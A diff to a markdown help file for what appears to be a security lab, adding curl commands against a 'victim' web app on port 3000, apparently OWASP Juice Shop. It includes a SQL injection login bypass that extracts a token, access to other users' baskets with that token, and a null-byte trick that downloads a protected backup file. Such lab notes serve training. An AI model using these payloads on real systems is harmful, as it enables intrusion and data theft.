@@ -1,6 +1,5 @@
 # Help
 
-
 ## Yandex Cloud
 
 ### Create VM
@@ -52,12 +51,30 @@ sudo suricata -c /etc/suricata/suricata.yaml -q 0
 ### A01:2021 Broken Access Control
 
 ```bash
-curl -s -X POST "http://172.20.0.106:3000/rest/user/login" \
+curl -s -X POST victim:3000/rest/user/login \
   -H "Content-Type: application/json" \
   -d "{\"email\":\"' OR 1=1 --\",\"password\":\"any\"}" | jq -r '.authentication.token'
 
-export $TOKEN=...
+export TOKEN=...
 
-curl -H "Authorization: Bearer $TOKEN" "http://172.20.0.106:3000/rest/basket/1" | jq
-curl -H "Authorization: Bearer $TOKEN" "http://172.20.0.106:3000/rest/basket/2" | jq
+curl -X GET victim:3000/rest/basket/1 \
+     -H "Authorization: Bearer $TOKEN" | jq
+```
+
+### A02:2021 Cryptographic Failures
+
+```bash
+curl -X GET victim:3000/ftp/package.json.bak # won't work
+curl -X GET "victim:3000/ftp/package.json.bak%2500.md" \
+     -o package.json.bak
+curl -X GET "victim:3000/ftp/package.json.bak%2500.pdf" \
+     -o package.json.bak
+```
+
+### A03:2021 Injection
+
+```bash
+curl -X POST victim:3000/rest/user/login \
+     -H "Content-Type: application/json" \
+     -d "{\"email\":\"' OR 1=1 --\",\"password\":\"any\"}"
 ```
